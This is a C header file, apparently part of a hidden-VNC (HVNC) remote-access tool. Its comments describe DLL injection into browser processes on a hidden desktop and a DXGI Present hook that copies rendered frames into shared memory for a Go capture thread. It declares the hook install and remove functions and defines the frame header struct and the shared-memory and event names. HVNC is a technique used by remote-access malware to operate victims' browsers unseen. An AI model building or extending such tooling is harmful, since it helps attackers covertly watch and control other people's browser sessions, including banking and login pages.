//===============================================================================================//
// HVNCCapture — DXGI SwapChain::Present hook for fast HVNC frame capture.
//
// Injected into browser processes running on the hidden desktop. Hooks
// IDXGISwapChain::Present to intercept rendered frames, copies the backbuffer
// to a named shared-memory section so the Go capture thread can read them
// directly instead of using the slow PrintWindow API.
//
// Shared memory layout (HVNCFrameHeader at offset 0, then pixel data):
//   [HVNCFrameHeader][BGRA pixel data, stride-aligned rows]
//
// Signaling: named event "Local\hvnc_frame_{pid}" is set after each new frame.
//===============================================================================================//
#ifndef _DXGI_CAPTURE_H
#define _DXGI_CAPTURE_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

// Initialize DXGI Present hook. Call from DllMain(DLL_PROCESS_ATTACH).
void InstallDXGICapture(void);

// Remove hook and clean up shared memory. Call from DllMain(DLL_PROCESS_DETACH).
void RemoveDXGICapture(void);

#ifdef __cplusplus
}
#endif

// Shared memory header — must match Go-side definition exactly.
#pragma pack(push, 1)
typedef struct {
    UINT32 magic;       // 'HVNC' = 0x434E5648
    UINT32 version;     // 1
    UINT32 width;
    UINT32 height;
    UINT32 stride;      // bytes per row (width * 4, may be padded)
    UINT32 format;      // DXGI_FORMAT value (87 = B8G8R8A8_UNORM)
    UINT64 frameSeq;    // monotonically increasing frame counter
    UINT64 timestampNs; // QueryPerformanceCounter-based nanoseconds
    UINT32 pid;         // process ID that produced this frame
    UINT32 reserved;    // alignment padding
} HVNCFrameHeader;
#pragma pack(pop)

#define HVNC_FRAME_MAGIC  0x434E5648  // 'HVNC'
#define HVNC_FRAME_VERSION 1

// Maximum frame dimensions we support (prevents runaway allocation)
#define HVNC_MAX_WIDTH  7680
#define HVNC_MAX_HEIGHT 4320

// Shared memory name format — {pid} is the decimal process ID
// e.g. "Local\hvnc_frame_12345"
#define HVNC_SHM_PREFIX   "Local\\hvnc_frame_"
#define HVNC_EVENT_PREFIX  "Local\\hvnc_evt_"

#endif // _DXGI_CAPTURE_H
